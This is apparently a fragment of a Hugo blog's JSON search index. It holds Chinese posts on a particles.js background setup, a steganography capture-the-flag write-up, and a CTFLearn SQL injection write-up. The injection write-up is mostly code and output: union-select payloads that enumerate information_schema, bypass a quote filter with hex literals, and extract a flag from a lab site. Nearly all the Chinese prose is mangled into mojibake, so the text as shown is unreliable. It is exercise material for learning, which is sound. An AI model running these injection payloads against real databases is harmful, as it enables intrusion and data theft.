å†™å¥½çš„ä¸œè¥¿å§ã€‚\næ¥ä¸‹æ¥çš„ä¸€æ­¥å¾ˆé‡è¦ï¼šæŠŠè¿™ä¸¤ä¸ªæ–‡ä»¶æ”¾å…¥public/jsæ–‡ä»¶å¤¹ä¸­!\nä½ éƒ½çœ‹åˆ°è¿™ç¯‡æ–‡ç« äº†ï¼Œè‚¯å®šå·²ç»åœ¨GitHubä¸Šæœ‰è‡ªå·±çš„ç¬¬ä¸€ä¸ªé¡µé¢äº†å§ï¼Ÿä½ ä¼šå‘ç°ï¼Œpublicæ–‡ä»¶å¤¹çš„ç»“æ„è·Ÿä½ çš„ä»“åº“çš„ç»“æ„æ˜¯ä¸€æ ·çš„ï¼Œæˆ‘ä»¬çš„GitPageçš„CSSã€JSç­‰æ–‡ä»¶ï¼Œéƒ½å­˜åœ¨å¯¹åº”çš„è·¯å¾„åº•ä¸‹ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œ**å½“ä½ æŠŠè¿™ä¸¤ä¸ªJSæ–‡ä»¶æ”¾åˆ°äº†public/jsæ–‡ä»¶å¤¹åº•ä¸‹ï¼Œä½ ç­‰ä¸€ä¸‹git pushçš„æ—¶å€™å°±ä¼šæŠŠè¿™ä¸¤ä¸ªæ–‡ä»¶ä¹Ÿä¸€å¹¶æ¨é€åˆ°è¿œç¨‹ä»“åº“çš„å¯¹åº”ä½ç½®ã€‚**è¿™æ ·ï¼Œä½ çš„æºç å°±èƒ½æ‰¾åˆ°JSæ–‡ä»¶äº†ã€‚\nå°†ä¸¤ä¸ªJSæ–‡ä»¶å¼•å…¥ï¼Œè®°å¾—æ”¾åœ¨ç¬¬äºŒæ­¥çš„divåé¢ï¼š\n\u0026lt;script src=\u0026#34;xxxxx/app.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;xxxxx/particles.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; è¿™é‡Œçš„â€œxxxxâ€æ˜¯ä½ æ”¾ç½®è¿™ä¸¤ä¸ªæ–‡ä»¶çš„è·¯å¾„ï¼Œæˆ‘æ¥ä¸‹æ¥è¦æ•™ä½ ä¸€ä¸ªå–å·§çš„åŠæ³•ã€‚\nå·§å¦™åœ°è·å–è·¯å¾„ å¦‚æœä½ çš„ä»£ç ä¸­ï¼Œè¿™ä¸¤ä¸ªJSæ–‡ä»¶çš„è·¯å¾„å‡ºäº†é—®é¢˜ï¼Œé‚£å¾ˆä¸å¹¸ï¼Œå½“ä½ æ‰“å¼€é¡µé¢çš„æ—¶å€™ä¸€å®šæ˜¯è§ä¸åˆ°èƒŒæ™¯çš„ï¼Œè€Œä¸”ï¼Œä½ æŒ‰ä¸‹F12ï¼Œè¿˜èƒ½çœ‹åˆ°æ§åˆ¶å°ç»™ä½ æŠ¥å‡ºçš„æ— æƒ…çš„404 Not Foundã€‚\næˆ‘ä»¬è¦æ€ä¹ˆä½¿è¿œç¨‹ä»“åº“ä¸­çš„ä»£ç ä¹Ÿèƒ½æ‰¾åˆ°æ­£ç¡®çš„è·¯å¾„å‘¢ï¼Ÿå¦‚æœä½¿ç”¨src=\u0026quot;/js/app.js\u0026quot;è¿™æ ·çš„è¯­å¥ï¼Œå½“ä½ æ‰“å¼€ç½‘ç«™çš„ä¸»é¡µï¼Œå®ƒä¼šæ‰¾åˆ°https://yourWeb.github.io/js/app.jsï¼Œçœ‹èµ·æ¥éå¸¸çš„æ­£ç¡®ï¼›ä½†æ˜¯å½“ä½ åœ¨ç½‘ç«™é‡Œé¢çš„æŸä¸ªé¡µé¢é‡Œï¼Œæ¯”å¦‚æŸä¸€ç¯‡åšæ–‡ä¸­ï¼Œå®ƒå°±ä¼šå»æ‰¾https://yourWeb.github.io/post/article1/js/app.jsï¼Œå¿…ç„¶æ˜¯å¤±è´¥çš„ï¼Œäºæ˜¯ä½ çš„åšæ–‡å°±ä¸èƒ½æœ‰æ¼‚äº®çš„èƒŒæ™¯äº† :(\næ­£ç¡®çš„è·å–è·¯å¾„çš„å§¿åŠ¿ï¼Œä½ å¯ä»¥ç›´æ¥ä½¿ç”¨ç»å¯¹è·¯å¾„ï¼Œä¹Ÿå°±æ˜¯https://yourWeb.github.io/js/app.jsè¿™æ ·çš„æ–¹å¼ã€‚\nåº•ä¸‹æ˜¯æˆ‘çš„ä»£ç ï¼Œç»å¯¹è·¯å¾„çš„æ–¹æ³•ç†è®ºä¸Šé€‚ç”¨äºæ‰€æœ‰ä¸»é¢˜ï¼Œä½ åº”è¯¥æŠŠä»£ç é‡Œçš„srcå€¼æ”¹æˆè‡ªå·±çš„ä»“åº“ï¼š\n\u0026lt;script src=\u0026#34;https://sgs4ever.github.io/js/particles.js\u0026#34; async=\u0026#34;\u0026#34; \u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;https://sgs4ever.github.io/js/app.js\u0026#34; async=\u0026#34;\u0026#34; \u0026gt;\u0026lt;/script\u0026gt; ä»£ç çš„æœ€ç»ˆæ ·å¼åŠæ¨é€ ç»è¿‡ä¸€ç³»åˆ—çš„ä¿®æ”¹åï¼Œä½ çš„é¡µé¢çš„ä»£ç å°±å¤šäº†å¦‚ä¸‹çš„ä¸œè¥¿ï¼š\n\u0026lt;div id=\u0026#34;particles-js\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;script src=\u0026#34;https://sgs4ever.github.io/js/particles.js\u0026#34; async=\u0026#34;\u0026#34; \u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;https://sgs4ever.github.io/js/app.js\u0026#34; async=\u0026#34;\u0026#34; \u0026gt;\u0026lt;/script\u0026gt; æ­¤å¤–ï¼Œä½ çš„public/jsæ–‡ä»¶å¤¹ä¸­è¿˜å¤šäº†ä¸¤ä¸ªæ–‡ä»¶app.jså’Œparticles.jsã€‚\nç°åœ¨ï¼Œä¸è¦ä»¥ä¸ºä¸€åˆ‡å·²ç»ç»“æŸäº†ï¼Œå› ä¸ºä½ çš„è¿™ä¸ªdivï¼Œä½ çš„é¡µé¢ç°åœ¨å¤šäº†ä¸€ä¸ªå…ƒç´ ï¼Œå¦‚æœå®ƒä½äºfooterä¸Šæ–¹ï¼Œé‚£å®ƒä¼šä½¿å¾—ä½ çš„é¡µé¢è¢«æ’‘å¾—å¾ˆé•¿ï¼Œæˆ‘ä»¬è¦åœ¨ä¸»é¡µé¢çš„CSSæ–‡ä»¶é‡Œä¿®æ”¹å®ƒã€‚\nè¿›å…¥public/cssæ–‡ä»¶å¤¹ï¼Œå¦‚æœæ˜¯Keepitä¸»é¢˜ï¼Œå°±åªæœ‰ä¸€ä¸ªæ–‡ä»¶ï¼Œæ‰“å¼€å®ƒï¼›å¦‚æœæ˜¯å…¶ä»–ä¸»é¢˜ï¼Œä½ éœ€è¦æ‰¾åˆ°èƒ½å‘æŒ¥ä½œç”¨çš„CSSã€‚\nåœ¨æ–‡ä»¶æœ€æœ«å°¾è¡¥ä¸Šè¿™æ ·çš„ä»£ç ï¼š\n.particles-js-canvas-el { position:fixed; top:0; left:0; width:100% } positionè®¾å®šä¸ºfixedï¼Œä½¿å¾—æ•´å—ç”»å¸ƒç‹¬ç«‹äºä½ é¡µé¢çš„å…¶ä»–å…ƒç´ ï¼›ç”±äºå®ƒç‹¬ç«‹äº†ï¼Œå°±éœ€è¦ä½¿ç”¨topã€leftæ¥æŒ‡å®šå®ƒçš„ä½ç½®ï¼›æœ€åæ˜¯ç”»å¸ƒçš„å®½åº¦ï¼Œå¡«æ»¡æ•´ä¸ªå±å¹•å³å¯ã€‚\nè¿™æ ·ï¼Œå°±å®Œæˆäº†æ‰€æœ‰çš„æ­¥éª¤äº†ã€‚\næˆ‘ä»¬å›é¡¾ä¸€ä¸‹æ€»å…±åšäº†ä»€ä¹ˆï¼š\nä¸‹è½½ä¸»é¢˜ï¼Œå°†ä¸¤ä¸ªJSæ–‡ä»¶æ”¾åˆ°public/jsæ–‡ä»¶å¤¹é‡Œã€‚ åœ¨ä»£ç çš„ç›¸åº”ä½ç½®å†™ä¸Šdivã€‚ åœ¨divçš„ä¸‹æ–¹ç”¨scriptæ ‡ç­¾å’Œç»å¯¹è·¯å¾„å¼•å…¥è¿™ä¸¤ä¸ªæ–‡ä»¶ã€‚ ä¿®æ”¹CSSï¼Œä½¿èƒŒæ™¯ç‹¬ç«‹ã€‚ å®Œæˆä»¥ä¸Šæ­¥éª¤ï¼Œå°±ä½¿ç”¨hugoç¼–è¯‘é™æ€é¡µé¢ï¼Œç„¶åè¿›å…¥publicæ–‡ä»¶å¤¹ç”¨gitæŠŠå®ƒæ¨é€åˆ°è¿œç¨‹ä»“åº“ä¸Šå§ï¼\nèƒŒæ™¯æ ·å¼çš„ä¿®æ”¹ å¦‚æœä¸€åˆ‡é¡ºåˆ©ï¼Œä½ çš„èƒŒæ™¯å·²ç»å¾ˆä¸é”™äº†ã€‚ç°åœ¨ä½ å¯ä»¥é€šè¿‡é…ç½®app.jsçš„æ–¹æ³•è¿›ä¸€æ­¥ä¿®æ”¹å®ƒã€‚\napp.jsæ–‡ä»¶æ˜¯é…ç½®èƒŒæ™¯çš„æ–‡ä»¶ï¼Œå®ƒå¯ä»¥æ”¹å˜èƒŒæ™¯ä¸­æ¯ä¸ªç²’å­çš„å½¢çŠ¶ã€é¢œè‰²ã€ç§»åŠ¨æ–¹å¼ç­‰ç­‰ã€‚\nä¸‹é¢è¿™ä¸ªé“¾æ¥å°†æ¯ä¸€ä¸ªå­—æ®µçš„å–å€¼å’Œå«ä¹‰å†™å¾—éå¸¸æ¸…æ¥šï¼š\n(https://www.jb51.net/article/123594.htm)\nä¾‹å¦‚æˆ‘çš„particles.color.value = \u0026quot;random\u0026quot;ï¼Œè¿™æ˜¯ä¸ºäº†åœ¨ç™½è‰²ä¸»é¢˜çš„æƒ…å†µä¸‹ä¹Ÿå¯ä»¥çœ‹åˆ°èƒŒæ™¯ç‰¹æ•ˆã€‚\nä¸€äº›ç»†èŠ‚ æ­¤éƒ¨åˆ†å¢åŠ äº2021å¹´1æœˆ14æ—¥\nåšå®¢å·²ç»å‘å¸ƒäº†åæ¥ç¯‡æ–‡ç« ï¼Œé‡çœ‹æ­¤æ–‡ï¼Œæœ‰ä¸€äº›ç»†èŠ‚ï¼ˆæˆ–ä¸å¦‚è¯´æ˜¯é—ç•™çš„BUGï¼‰æ˜¯å€¼å¾—ä¸€æçš„ã€‚\nJSçš„åŠ è½½é¡ºåºã€‚æœ¬æ–‡å‰é¢çš„ä»£ç å·²ç»å°†JSçš„åŠ è½½é¡ºåºè€ƒè™‘äº†è¿›æ¥ï¼Œä¸”æ·»åŠ äº†asyncæ ‡ç­¾æŒ‡ç¤ºæµè§ˆå™¨æŒ‰ç…§é¡ºåºåŠ è½½ä¸¤ä¸ªJSæ–‡ä»¶ï¼Œç„¶è€Œè¿™æ ·çš„å†™æ³•ä¼¼ä¹æ˜¯æ— ç”¨çš„ï¼Œå› ä¸ºæˆ‘çš„åšå®¢è¿˜æ˜¯æ—¶ä¸æ—¶åœ°ä¸¢å¤±æ‰èƒŒæ™¯æ•ˆæœï¼›å®é™…ä¸Šä½¿å¾—JSæŒ‰ç…§é¡ºåºåŠ è½½çš„åŠæ³•è¿˜æœ‰ä¸å°‘ï¼Œå¯ä»¥ç•™å¾…è¯»è€…è‡ªè¡ŒæŸ¥æ‰¾èµ„æ–™å®ç°ï¼ˆä¸»è¦æ˜¯ä½œè€…æ‡’ï¼‰ã€‚ hugoçš„ç‰ˆæœ¬ã€‚åšå®¢æ­å»ºæŒ‡å—â€”â€”1ä¸­æåˆ°äº†è¦ä¸‹è½½hugo-extendï¼Œä½ é™¤äº†ä½¿ç”¨æ–‡ç« ä¸­ä»‹ç»çš„åŠæ³•ä¸‹è½½ä¹‹å¤–ï¼Œè¿˜å¯ä»¥ä½¿ç”¨chocolateåŒ…ç®¡ç†å™¨ä¸‹è½½ï¼Œå…·ä½“åšæ³•å¯ä»¥ä½¿ç”¨æœç´¢å¼•æ“æŸ¥æ‰¾ï¼Œæ¯”è¾ƒç®€å•ã€‚è€Œæ­£å¦‚é‚£ç¯‡æ–‡ç« ä¸­æ‰€è¯´ï¼Œå¦‚æœä½ ä¸å®‰è£…extendç‰ˆæœ¬ï¼Œä½ å°†æ— æ³•ç¼–è¯‘SCSSæ–‡ä»¶ï¼Œè€Œè¿™å¯¹äºæˆ‘ä»¬è¿™æ¬¾ä¸»é¢˜ï¼ˆç›¸ä¿¡è¿˜æœ‰å…¶ä»–å¾ˆå¤šç²¾ç¾çš„ä¸»é¢˜ï¼‰æ¥è¯´æ˜¯å¾ˆè‡´å‘½çš„ã€‚ä¸æœ¬æ–‡ç›¸å…³çš„ï¼Œå¦‚æœä½ ä½¿ç”¨çš„ä¸æ˜¯extendç‰ˆæœ¬çš„hugoï¼Œä½ åœ¨ç¬¬5å°èŠ‚ä¸­è‡ªå®šä¹‰çš„CSSæ ·å¼å¯èƒ½ä¸ä¼šç”Ÿæ•ˆã€‚ ä»¥ä¸Šï¼Œæ˜¯æœ¬ç¯‡çš„å…¨éƒ¨å†…å®¹ã€‚\n","date":"2020-09-19T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%8C%87%E5%8D%972/","title":"åšå®¢æ­å»ºæŒ‡å—â€”â€”2"},{"content":"é¢˜ç›®é“¾æ¥ï¼š(https://ctflearn.com/challenge/97)\nä¸€é“éšå†™é¢˜ï¼Œä¿¡æ¯éšè—åœ¨ç»™å‡ºçš„å›¾ç‰‡æ–‡ä»¶é‡Œã€‚\næ‰“å¼€å›¾ç‰‡ï¼Œæ˜¯ä¸€å¼ æ™®é€šçš„pngï¼Œä½¿ç”¨010editoræ‰“å¼€ï¼Œå‘ç°å®é™…ä¸Šæ˜¯jpgæ ¼å¼ï¼ˆä»¥FFå¼€å¤´ï¼‰ã€‚\n010 editoræœç´¢FF D9ï¼Œæ‰¾åˆ°åç§»é‡ä¸º0x256Eå¤„çš„é‚£ä¸ªï¼Œå‘ç°å…¶åæœ‰æ•æ„Ÿçš„PKå­—æ ·ï¼Œè¿™æ˜¯zipæ–‡ä»¶çš„å¼€å¤´ï¼Œçº¿ç´¢å·²ç»å‡ºç°äº†ã€‚\nä½¿ç”¨å‘½ä»¤åˆ†ç¦»å‡ºzipæ–‡ä»¶ã€‚dd if=AGT.png bs=1 skip=9584 of=foo.zip\nè§£å‹æ–‡ä»¶ï¼Œå¾—åˆ°ä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œé‡Œé¢å«æœ‰ä¸€å¼ å›¾ç‰‡I Warned You.jpeg\n010 editoræ‰“å¼€è¯¥æ–‡ä»¶ï¼Œå‘ç°å®ƒå®é™…ä¸Šä¸ç¬¦åˆJPGæ–‡ä»¶çš„æ ¼å¼ã€‚ç”¨è®°äº‹æœ¬æ‰“å¼€ï¼Œctrl + fæŸ¥æ‰¾ctfå­—æ ·ï¼Œå¾—åˆ°flagã€‚\nå›é¡¾\nè¿™é“é¢˜å¤§æ¦‚åšäº†å°†è¿‘ä¸€å°æ—¶\u0026hellip; æ˜¯æˆ‘æ¥è§¦éšå†™é¢˜çš„ç®€å•è§£æ³•ä¹‹åç¬¬ä¸€æ¬¡å®è·µã€‚è§£å‹ä¹‹åçš„jpgæ–‡ä»¶ä½¿æˆ‘ä¸€åº¦æ€€ç–‘è‡ªå·±å¯¹åç§»é‡çš„è®¡ç®—å­˜åœ¨é—®é¢˜ï¼Œä¸‡ä¸‡æ²¡æƒ³åˆ°è¿™jpgæ ¼å¼å®Œå…¨æ˜¯ç”¨æ¥å‘çˆ¹çš„ï¼ˆ= = ||ï¼‰ã€‚\nä½¿ç”¨è®°äº‹æœ¬ä¸€å¼€å§‹æŸ¥æ‰¾çš„æ˜¯flagå­—ä¸²ï¼Œç»“æœæ˜¯æ²¡æ‰¾åˆ°ï¼Œå±…ç„¶ä¹Ÿæ²¡æœ‰å†æ‰¾ä¸€ä¸‹å…¶ä»–å¯èƒ½çš„å½¢å¼ï¼Œå°±è¿™ä¹ˆå›å»åˆåå¤æ£€æŸ¥zipæ–‡ä»¶çš„åç§»åœ°å€äº†\u0026hellip;\u0026hellip;\n","date":"2020-09-18T00:00:00Z","permalink":"https://xrg.fj.cn/p/ctflearn-07601/","title":"CTFLearn-07601"},{"content":"é¢˜ç›®é“¾æ¥ï¼š(https://ctflearn.com/challenge/149)\næ­¤é¢˜æ˜¯æˆ‘è‡³ä»Šåšåˆ°çš„æœ€éš¾çš„é¢˜ç›®ï¼Œå› æ­¤å†™ä¸€ä»½å›é¡¾æ˜¾å¾—å°¤ä¸ºå¿…è¦ã€‚èœé¸¡æˆé•¿çš„è·¯ä¸Šéœ€è¦ç”¨è¿™ç§æ–¹å¼ç§¯ç´¯ç»éªŒï¼Œå¸Œæœ›ä»¥åèƒ½æˆé•¿ä¸ºçœ‹åˆ°è¿™æ ·çš„é¢˜ç›®å°±ç›´å‘¼ç®€å•çš„é«˜æ‰‹\u0026hellip; \u0026hellip;\næ ¹æ®é¢˜æ„ï¼Œéœ€è¦ä½¿ç”¨UNIONè¯­å¥æ³¨å…¥ã€‚é¦–å…ˆè¿˜æ˜¯å…ˆè¿›è¡Œç®€å•çš„æ³¨å…¥æµ‹è¯•ã€‚ ret = requests.get(\u0026#34;https://web.ctflearn.com/web8/\u0026#34;, params={\u0026#34;id\u0026#34;: \u0026#34;2\u0026#34;}) soup = BeautifulSoup(ret.text, \u0026#39;lxml\u0026#39;) print(soup.prettify()) # Output: # Name: Doodle # Bread: Poodle # Color: Pink åœ¨æ•°å­—2ä¹‹åé™„ä¸Šç®€å•çš„å¸ƒå°”è¡¨è¾¾å¼ï¼Œè§‚å¯Ÿç»“æœã€‚\nret = requests.get(\u0026#34;https://web.ctflearn.com/web8/\u0026#34;, params={\u0026#34;id\u0026#34;: \u0026#34;2 or 1=1\u0026#34;}) # Output: # å¾—åˆ°äº†ä¸‰ç»„Nameã€Breadã€Colorï¼Œè¯æ˜å¸ƒå°”è¯­å¥ç›´æ¥å¯ä»¥èµ·åˆ°ä½œç”¨ è‡³æ­¤ï¼Œæˆ‘ä»¬çŸ¥é“å¯ä»¥ç›´æ¥åœ¨æ•°å­—åé¢è·Ÿä¸Šä¸€ä¸ªè¡¨è¾¾å¼æˆ–è€…SQLè¯­å¥ï¼Œä¹Ÿå°±æ˜¯å¯ä»¥ç›´æ¥ä¸ŠUNIONè¯­å¥äº†ã€‚æˆ‘åœ¨ä»Šå¤©æ‰ç®—æ˜¯æ­£å¼åœ°æ¥è§¦äº†UNIIONæ³¨å…¥çš„æµç¨‹ï¼Œä»¥ä¸‹å°†åšå®Œæ•´çš„è®°å½•å’Œè§£é‡Šã€‚ é¦–å…ˆï¼Œä½¿ç”¨UNIONè¯­å¥åˆ¤æ–­æ¯ä¸€æ¬¡æŸ¥è¯¢çš„ç»“æœä¸€å…±æœ‰å‡ ä¸ªå­—æ®µã€‚åŸç†æ˜¯ä½¿ç”¨UNIONè¯­å¥åœ¨åŸæœ¬çš„æŸ¥è¯¢ç»“æœåé¢é™„åŠ è‡ªå·±æ„é€ çš„ä¸€è¡Œæ•°æ®ï¼Œå½“æˆ‘ä»¬æ„é€ çš„å­—æ®µæ•°ä¸åŸæœ¬çš„å­—æ®µæ•°ä¸ç¬¦åˆæ—¶ï¼Œå°†å¼•å‘å¼‚å¸¸ï¼Œå½“å­—æ®µæ•°åŒ¹é…æ—¶ï¼Œå°±æœ‰æ˜¾è€Œæ˜“è§çš„æ•ˆæœã€‚é¦–å…ˆå°è¯•3ä¸ªå­—æ®µã€‚\nret = requests.get(\u0026#34;https://web.ctflearn.com/web8/\u0026#34;, params={\u0026#34;id\u0026#34;: \u0026#34;-2 union select 1,2,3\u0026#34;}) # Output: # 0 results ç»“æœè¡¨æ˜3ä¸ªå­—æ®µæ˜¯ä¸å¯¹çš„ï¼Œé‚£ä¹ˆå†å¢åŠ ï¼š\nret = requests.get(\u0026#34;https://web.ctflearn.com/web8/\u0026#34;, params={\u0026#34;id\u0026#34;: \u0026#34;-2 union select 1,2,3,4\u0026#34;}) # Output: # Name: 2 # Breed: 1 # Color: 3 éå¸¸Niceï¼Œä¸ä»…è¡¨æ˜äº†æŸ¥è¯¢çš„ç»“æœæœ‰å››ä¸ªå­—æ®µï¼Œè€Œä¸”æ˜¾ç¤ºå‡ºæ¯ä¸ªå­—æ®µå¯¹åº”çš„æ˜¯ä»€ä¹ˆå«ä¹‰ã€‚å†è¯•è¯•5ä¸ªå­—æ®µï¼š\nret = requests.get(\u0026#34;https://web.ctflearn.com/web8/\u0026#34;, params={\u0026#34;id\u0026#34;: \u0026#34;2 union select 1,2,3,4,5\u0026#34;}) # Output: # 0 results å·²ç»æ˜ç¡®äº†ï¼Œç³»ç»Ÿåšçš„æ¯ä¸€æ¬¡æŸ¥è¯¢ç»“æœå°±æ˜¯æœ‰å››ä¸ªå­—æ®µï¼Œåªéœ€è¦å°†å¯¹åº”å­—æ®µçš„æ•°å­—æ”¹ä¸ºSQLè¯­å¥ï¼Œå°±å¯ä»¥æŠŠæˆ‘ä»¬éœ€è¦çš„ä¿¡æ¯åœ¨ç›¸åº”å­—æ®µæ˜¾ç¤ºå‡ºæ¥ã€‚\nå¼€å§‹æŸ¥çœ‹æ•°æ®åº“åï¼Œä½¿ç”¨database()å‡½æ•°æˆ–è€…information_schemaæ•°æ®åº“ç»´æŠ¤çš„ä¿¡æ¯ã€‚\ninformation_schema æ˜¯MySQLè‡ªå¸¦çš„æ•°æ®åº“ï¼Œå®ƒä¿å­˜ç€MySQLæœåŠ¡å™¨ç»´æŠ¤çš„æ‰€æœ‰å…¶ä»–æ•°æ®åº“çš„ä¿¡æ¯ï¼Œå¦‚æ•°æ®åº“åã€æ•°æ®åº“çš„è¡¨ã€è¡¨æ çš„æ•°æ®ç±»å‹ä¸è®¿é—®æƒé™ç­‰ã€‚ åœ¨æ­¤ä»…è®°å½•ç¬¬äºŒç§åŠæ³•ã€‚\nret = requests.get(\u0026#34;https://web.ctflearn.com/web8/\u0026#34;, params={\u0026#34;id\u0026#34;: \u0026#34;2 union select 1,(select group_concat(schema_name) from information_schema.schemata),3,4\u0026#34;}) # Output: # Name: Information_schema, webeight # Breed: 1 # Color: 3 è¿™é‡Œï¼Œgroup_concatä½¿å¾—æŸ¥è¯¢ç»“æœæ˜¯æ‰¹é‡çš„ï¼Œè€Œç¬¬äºŒä¸ªå­—æ®µå¯¹åº”åœ°æ˜¾ç¤ºå‡ºäº†æˆ‘ä»¬å¸Œæœ›çœ‹åˆ°çš„â€”â€”æ‰€æœ‰çš„æ•°æ®åº“åã€‚\nå¼€å§‹æŸ¥è¯¢webeightæ•°æ®åº“ä¸­çš„æ•°æ®è¡¨ã€‚\nret = requests.get(\u0026#34;https://web.ctflearn.com/web8/\u0026#34;, params={\u0026#34;id\u0026#34;: \u0026#34;2 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=0x7765626569676874),3,4\u0026#34;}) # Output: # Name: w0w_y0u_f0und_m3,webeight # Breed: 1 # Color: 3 è¿™é‡Œéœ€è¦æ³¨æ„ï¼Œæœ¬æ¥ç¬¬äºŒä¸ªå­—æ®µçš„SQLè¯­å¥åº”è¯¥æ˜¯ï¼š\nselect group_concat(table_name) from information_schema.tables where table_schema='webeight'\nä½†æ˜¯ï¼Œè¿™é“é¢˜ä¸­çš„å•å¼•å·æ˜¯è¢«è¿‡æ»¤çš„ï¼\näºæ˜¯é‡‡ç”¨åå…­è¿›åˆ¶æ¥è¡¨ç¤ºwebeightè¿™ä¸ªå­—ç¬¦ä¸²ï¼Œç›´æ¥è½¬æ¢ï¼Œä¸éœ€è¦è€ƒè™‘ä»€ä¹ˆå¤§ç«¯å°ç«¯å­˜å‚¨-ã€‚ï¼ˆæˆ‘åœ¨è¯´ä»€ä¹ˆxï¼‰\näºæ˜¯å°±æœ‰äº†ä¸Šé¢çš„é‚£å¥ï¼š\nselect group_concat(table_name) from information_schema.tables where table_schema=0x7765626569676874\nå¾—åˆ°çš„ç»“æœä¹Ÿæ˜¯æ¯”è¾ƒæ¼‚äº®çš„ï¼Œæ‰¾åˆ°äº†å…³é”®çš„è¡¨ã€‚\nå¾—åˆ°è¡¨ä¹‹åï¼Œè¦æŸ¥æ‰¾å­—æ®µäº†ã€‚æ–¹æ³•å·®ä¸å¤šï¼Œæ€»çš„æ¥è¯´å°±æ˜¯åœ¨æŠ˜è…¾information_schemaåº“ä¸­å­˜å‚¨çš„ä¿¡æ¯è€Œå·²ã€‚\nselect group_concat(column_name) from information_schema.columns where table_schema=0x7765626569676874 and table_name=0x7730775f7930755f6630756e645f6d33 # Output: # Name: f0und_m3 # ... è¿™é‡Œæ˜¯ç¬¬äºŒä¸ªå­—æ®µè¦å¡«å…¥çš„SQLè¯­å¥ï¼Œæ¯”è¾ƒé•¿ï¼Œå› æ­¤ä¸å†™å‡ºå®Œæ•´çš„pythonè¯­å¥ï¼Œä»¥å…é˜»ç¢è§‚ç»ã€‚\næ­¤å¤„è¦æ³¨æ„ï¼Œgroup_concat()ä¸­çš„å­—æ®µåcolumn_nameæ˜¯ä¸€å®šä¸èƒ½æ”¹çš„ï¼ŒåŒ…æ‹¬ä¹‹å‰çš„æ‰€æœ‰SQLè¯­å¥ï¼Œåœ¨æŸ¥è¯¢informationåº“çš„æ—¶å€™ï¼Œé€‰ç”¨çš„å­—æ®µåè¦æŒ‰ç…§è§„å®šçš„æ¥ï¼Œå¦åˆ™å¿…ç„¶å¾—ä¸åˆ°ç»“æœã€‚\nä»¥ä¸Šå·²ç»å¾—åˆ°äº†ç›®æ ‡è¡¨çš„ç›®æ ‡å­—æ®µï¼Œä½¿ç”¨æœ€åä¸€ä¸ªç®€å•çš„æŸ¥è¯¢ç»“æŸè¿™é“é¢˜ï¼š\nselect f0und_m3 from w0w_y0u_f0und_m3 # Output: # Name: abctf{uni0n_1s_4_gr34t_c0mm4nd} # ... æ€»ç»“ è¿™é“é¢˜å…‰æ˜¯é¢˜è§£å°±å·²ç»å†™äº†å°†è¿‘ä¸€å°æ—¶ï¼Œåªå¸Œæœ›æ—¥åæœ‰äººè¯»èµ·æ—¶ä¸è¦å¿˜è®°ä½œè€…ä½œä¸ºä¸€ä¸ªèœé¸¡åœ¨è¿™é¢˜é¢å‰è‹¦è‹¦æŒ£æ‰çš„ä¸€ä¸‹åˆã€‚SQLæ³¨å…¥çœŸæ˜¯ä¸€ä¸ªæ¼«é•¿è€Œå¤æ‚çš„è¿‡ç¨‹ï¼Œè€Œå…¶ä¸­å¤šæ•°éš¾ç‚¹å°±åœ¨äºæå®‰å…¨çš„äººå¯¹äºæ•°æ®åº“è¯­å¥ã€åº•å±‚å®ç°ç­‰çš„ä¸äº†è§£ï¼›æˆ‘åœ¨ä»Šå¤©æ‰æ¥è§¦åˆ°äº†information_schemaã€group_concatç­‰è¯¸å¤šçŸ¥è¯†ï¼Œæƒ³æ¥è¿™ä½œä¸ºä¸€ä¸ªç»ƒä¹ è¿˜æ˜¯ä½¿æˆ‘è·ç›Šé¢‡å¤šï¼Œä½†ä»Šåï¼Œæˆ‘è¿˜æ˜¯æ›´æ„¿æ„æŠ•é è‡ªåŠ¨åŒ–å·¥å…·çš„é˜µè¥\u0026hellip; \u0026hellip;\n","date":"2020-09-18T00:00:00Z","permalink":"https://xrg.fj.cn/p/ctflearn-inj3ctiontime/","title":"CTFLearn-Inj3ctionTime"},{"content":"å½“ä½ è§åˆ°è¿™ç¯‡æ–‡ç« çš„æ—¶å€™ï¼Œæ„å‘³ç€æˆ‘å¯ä»¥ç”¨ä¸€ç§æ¯”ä»·ä½“é¢çš„æ–¹å¼å‘æ‰€æœ‰äººåˆ†äº«æˆ‘çš„å­¦è¯†å’Œæƒ³æ³•äº†ã€‚\næ­å»ºåšå®¢ï¼Œè¯´éš¾ä¹Ÿéš¾ï¼Œè¯´å®¹æ˜“ä¹Ÿå®¹æ˜“ã€‚éš¾åœ¨ç¡®å®šå’Œå­¦ä¹ ä¸€æ¬¾å»ºç«™å·¥å…·ï¼Œä»¥åŠé€‰æ‹©ä¸€æ¬¾å¥½çœ‹çš„ä¸»é¢˜ï¼ˆæˆ–è€…æ‰‹å†™ä¸€æ¬¾å¥½çœ‹çš„ä¸»é¢˜ï¼‰ï¼Œè€Œå®¹æ˜“æŒ‡çš„æ˜¯å½“ä½ ç¨å¾®ä¼šä½¿ç”¨å»ºç«™å·¥å…·ã€å¹¶éå¸¸å¹¸è¿åœ°é€‰ä¸­äº†ä¸€æ¬¾å¥½çœ‹ä¸”æ˜“äºé…ç½®çš„ä¸»é¢˜ä¹‹åï¼Œä¸€åˆ‡åç»­éƒ½å˜å¾—æ— æ¯”ä¸æ»‘ã€‚\næœ¬åšå®¢ï¼Œéƒ¨ç½²äºGitHubï¼Œå±äºé™æ€ç½‘é¡µï¼Œä½¿ç”¨Hugoæ­å»ºï¼Œä½¿ç”¨ç°æˆçš„ä¸»é¢˜https://themes.gohugo.io/keepit/ã€‚\nå¦‚æœä½ è§‰å¾—è¿™ä¸ªä¸»é¢˜ä¸é”™ï¼Œé‚£ä¹ˆéå¸¸å¹¸è¿åœ°ï¼Œä½ å¯ä»¥å‚è€ƒæˆ‘å°†è¦å†™ä¸‹çš„ç»éªŒï¼Œå¦åˆ™æœ¬ç¯‡å¯¹ä½ çš„æ„ä¹‰å°†æ‰“ä¸ªæŠ˜æ‰£äº†ã€‚\nThen, let\u0026rsquo;s go!\nä¸‹è½½Hugo Hugo 